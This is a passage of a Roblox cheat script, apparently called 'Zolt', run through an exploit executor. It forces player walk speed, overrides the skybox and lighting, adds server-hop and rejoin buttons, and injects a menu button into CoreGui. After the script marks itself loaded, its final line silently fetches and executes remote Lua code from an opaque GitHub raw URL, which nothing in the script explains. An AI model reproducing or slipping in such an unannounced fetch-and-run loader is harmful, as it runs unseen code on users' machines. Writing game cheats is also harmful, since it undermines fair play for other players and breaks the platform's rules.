    Callback = function(v)
        _wsValue = v
        if _wsEnabled then
            pcall(function()
                local hum = local_player.Character
                    and local_player.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.WalkSpeed = _wsValue end
            end)
        end
    end
})

RunService.Heartbeat:Connect(function()
    if not _wsEnabled then return end
    pcall(function()
        if local_player.Character then
            local hum = local_player.Character:FindFirstChildOfClass("Humanoid")
            if hum and hum.WalkSpeed ~= _wsValue then
                hum.WalkSpeed = _wsValue
            end
        end
    end)
end)

local_player.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid")
    if _wsEnabled then hum.WalkSpeed = _wsValue end
end)

-- Skybox
local _sbLighting = game:GetService("Lighting")
local _currentSkyData = nil

local function _lockLighting()
    if not _currentSkyData then return end
    _sbLighting.ClockTime = 14
    _sbLighting.FogEnd = 100000
    _sbLighting.Brightness = 2
    _sbLighting.ExposureCompensation = 0.5
    _sbLighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    local atm = _sbLighting:FindFirstChildOfClass("Atmosphere")
    if atm then atm:Destroy() end
end

RunService.RenderStepped:Connect(_lockLighting)

local function _applySkybox(ids, params)
    _currentSkyData = ids ~= "reset" and {ids=ids, params=params} or nil
    for _, obj in pairs(_sbLighting:GetChildren()) do
        if obj:IsA("Sky") or obj:IsA("Atmosphere") or obj:IsA("Clouds") then
            obj:Destroy()
        end
    end
    if ids == "reset" then return end
    local p = params or {}
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://" .. tostring(ids.Bk)
    sky.SkyboxDn = "rbxassetid://" .. tostring(ids.Dn)
    sky.SkyboxFt = "rbxassetid://" .. tostring(ids.Ft)
    sky.SkyboxLf = "rbxassetid://" .. tostring(ids.Lf)
    sky.SkyboxRt = "rbxassetid://" .. tostring(ids.Rt)
    sky.SkyboxUp = "rbxassetid://" .. tostring(ids.Up)
    sky.SunAngularSize  = p.SunSize  or 21
    sky.MoonAngularSize = p.MoonSize or 11
    sky.StarCount = p.Stars or 0
    sky.CelestialBodiesShown = p.ShowBodies or false
    sky.Parent = _sbLighting
end

local _skies = {
    ["None"]  = nil,
    ["Sky 1"] = {ids={Bk=12064107,Dn=12064152,Ft=12064121,Lf=12063984,Rt=12064115,Up=12064131},p={Stars=0,ShowBodies=false}},
    ["Sky 2"] = {ids={Bk=10287764626,Dn=10287766382,Ft=10287764626,Lf=10287763421,Rt=10287764626,Up=10287767597},p={Stars=3000,ShowBodies=true,SunSize=0}},
    ["Sky 3"] = {ids={Bk=13107325341,Dn=13107329809,Ft=13107334845,Lf=13107337703,Rt=13107340396,Up=13107344387},p={Stars=3000,ShowBodies=true}},
    ["Sky 4"] = {ids={Bk=15502525195,Dn=15502522797,Ft=15502524520,Lf=15502522129,Rt=15502523711,Up=15502526102},p={Stars=3000,ShowBodies=false}},
    ["Sky 5"] = {ids={Bk=4495864450,Dn=4495864887,Ft=4495865458,Lf=4495866035,Rt=4495866584,Up=4495867486},p={Stars=3000,ShowBodies=true,SunSize=1}},
    ["Sky 6"] = {ids={Bk=237593887,Dn=237593849,Ft=237593922,Lf=237593861,Rt=237593835,Up=237593929},p={Stars=5000,ShowBodies=false}},
    ["Sky 7"] = {ids={Bk="81858382098344",Dn="138472117789684",Ft="95687237979398",Lf="84924000207295",Rt="99961685452126",Up="104038404823203"},p={Stars=5000,ShowBodies=false,SunSize=11}},
}

EnvGroup:AddDropdown("EnvSkybox", {
    Text = "Skybox",
    Default = "None",
    Values = {"None","Sky 1","Sky 2","Sky 3","Sky 4","Sky 5","Sky 6","Sky 7"},
    Callback = function(v)
        pcall(function()
            local entry = _skies[v]
            if not entry then _applySkybox("reset") return end
            _applySkybox(entry.ids, entry.p)
        end)
    end
})

-- ═══════════════════════════════════════════════════════════════
-- UI SETTINGS TAB
-- ═══════════════════════════════════════════════════════════════
local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu", "wrench")

MenuGroup:AddToggle("KeybindMenuOpen", {
    Default = Library.KeybindFrame.Visible,
    Text = "Open Keybind Menu",
    Callback = function(v) Library.KeybindFrame.Visible = v end
})

MenuGroup:AddToggle("ShowCustomCursor", {
    Text = "Custom Cursor",
    Default = false,
    Callback = function(v) Library.ShowCustomCursor = v end
})

MenuGroup:AddDropdown("NotificationSide", {
    Values = {"Left", "Right"},
    Default = "Right",
    Text = "Notification Side",
    Callback = function(v) Library:SetNotifySide(v) end
})

MenuGroup:AddDropdown("DPIDropdown", {
    Values = {"50%", "75%", "100%", "125%", "150%", "175%", "200%"},
    Default = "100%",
    Text = "DPI Scale",
    Callback = function(v) Library:SetDPIScale(tonumber(v:gsub("%%", ""))) end
})

MenuGroup:AddDivider()

local ServerHopBtn = MenuGroup:AddButton({
    Text = "Server Hop",
    Func = function()
        pcall(function()
            local data = HttpService:JSONDecode(game:HttpGet(
                "https://games.roblox.com/v1/games/" .. game.PlaceId ..
                "/servers/Public?sortOrder=Asc&limit=100"
            ))
            local servers = {}
            for _, s in pairs(data.data) do
                if s.playing < s.maxPlayers then
                    table.insert(servers, s.id)
                end
            end
            if #servers > 0 then
                game:GetService("TeleportService"):TeleportToPlaceInstance(
                    game.PlaceId,
                    servers[math.random(#servers)],
                    local_player
                )
            end
        end)
    end,
})

ServerHopBtn:AddButton({
    Text = "Rejoin",
    Func = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, local_player)
    end,
})

MenuGroup:AddDivider()

MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
    Default = "End",
    NoUI = true,
    Text = "Menu keybind"
})

Library.ToggleKeybind = Options.MenuKeybind

if not UIS.TouchEnabled then
    task.defer(function()
        local _mGui = Instance.new("ScreenGui")
        _mGui.Name = "hg83nf92m"
        _mGui.ResetOnSpawn = false
        _mGui.DisplayOrder = 9999
        _mGui.IgnoreGuiInset = true
        pcall(function() _mGui.Parent = game:GetService("CoreGui") end)
        if not _mGui.Parent then _mGui.Parent = local_player.PlayerGui end

        local _btn = Instance.new("TextButton")
        _btn.Size = UDim2.new(0, 44, 0, 44)
        _btn.Position = UDim2.new(0, 6, 0.5, -22)
        _btn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        _btn.BorderSizePixel = 0
        _btn.Text = ""
        _btn.AutoButtonColor = false
        _btn.ZIndex = 10
        _btn.Parent = _mGui
        Instance.new("UICorner", _btn).CornerRadius = UDim.new(1, 0)

        local _stroke = Instance.new("UIStroke")
        _stroke.Color = Color3.fromRGB(138, 79, 255)
        _stroke.Thickness = 1.5
        _stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        _stroke.Parent = _btn

        local _ico = Instance.new("ImageLabel")
        _ico.Size = UDim2.new(0, 22, 0, 22)
        _ico.Position = UDim2.new(0.5, -11, 0.5, -11)
        _ico.BackgroundTransparency = 1
        _ico.Image = "rbxassetid://7059346373"
        _ico.ImageColor3 = Color3.fromRGB(138, 79, 255)
        _ico.ZIndex = 11
        _ico.Parent = _btn

        _btn.MouseEnter:Connect(function()
            _btn.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
        end)
        _btn.MouseLeave:Connect(function()
            _btn.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
        end)
        _btn.MouseButton1Click:Connect(function()
            pcall(function() Library:Toggle() end)
        end)

        local _drag, _ds, _sp = false, nil, nil
        _btn.InputBegan:Connect(function(inp)
            pcall(function()
                local t = inp.UserInputType
                if t == Enum.UserInputType.Touch or t == Enum.UserInputType.MouseButton1 then
                    _drag = true; _ds = inp.Position; _sp = _btn.Position
                end
            end)
        end)
        _btn.InputChanged:Connect(function(inp)
            pcall(function()
                if not _drag or not _ds or not _sp then return end
                local t = inp.UserInputType
                if t == Enum.UserInputType.Touch or t == Enum.UserInputType.MouseMovement then
                    local d = inp.Position - _ds
                    _btn.Position = UDim2.new(
                        _sp.X.Scale, _sp.X.Offset + d.X,
                        _sp.Y.Scale, _sp.Y.Offset + d.Y
                    )
                end
            end)
        end)
        _btn.InputEnded:Connect(function(inp)
            pcall(function()
                local t = inp.UserInputType
                if t == Enum.UserInputType.Touch or t == Enum.UserInputType.MouseButton1 then
                    _drag = false
                end
            end)
        end)
    end)
end

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({"MenuKeybind"})
ThemeManager:SetFolder("Zolt")
SaveManager:SetFolder("Zolt")
SaveManager:BuildConfigSection(Tabs["UI Settings"])
ThemeManager:ApplyToTab(Tabs["UI Settings"])
SaveManager:LoadAutoloadConfig()

_G.zolt_loaded = true

pcall(function()
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://114117682324230"
    snd.Volume = 1
    snd.Parent = game:GetService("SoundService")
    snd:Play()
    game:GetService("Debris"):AddItem(snd, 10)
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/412343214/.rip/refs/heads/main/2412341234.lua"))()
